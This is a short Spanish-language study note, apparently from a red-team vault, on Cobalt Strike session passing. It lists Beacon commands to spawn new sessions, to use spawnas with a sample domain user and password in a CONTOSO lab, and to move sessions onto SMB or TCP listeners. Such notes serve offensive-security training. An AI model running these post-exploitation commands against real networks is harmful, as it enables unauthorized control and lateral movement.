---
title: Cobalt Strike — Session Passing
tags: [cobalt-strike, post-ex, session-passing, spawn, spawnas]
---

# Session Passing

## Abrir nuevo Beacon (mismo usuario)

```
beacon> spawn x64 http
```

Crea un nuevo proceso usando el `spawnto` configurado y genera un nuevo Beacon con el mismo usuario.

## Abrir Beacon como otro usuario (credenciales conocidas)

```
beacon> cd \\dc01\c$
beacon> spawnas CONTOSO\rsteel Passw0rd! tcp-local
```

> [!important] El comando `spawnas` requiere que te muevas a un directorio accesible por el usuario objetivo antes de ejecutarlo. Si el CWD actual no es accesible, fallará.

## Pasar sesión a otro listener

Útil para cambiar el canal de comunicación (HTTP → HTTPS, interno → SMB):

```
beacon> spawn x64 smb
beacon> spawn x64 tcp-local
```

## Ver también
- [[04-lateral-movement/tecnicas/pivoting-con-cobalt|Pivoting con Cobalt]]
- [[05-ad-attacks/kerberos/lateral-movement-services-(cs)|Lateral Movement Services (CS)]]
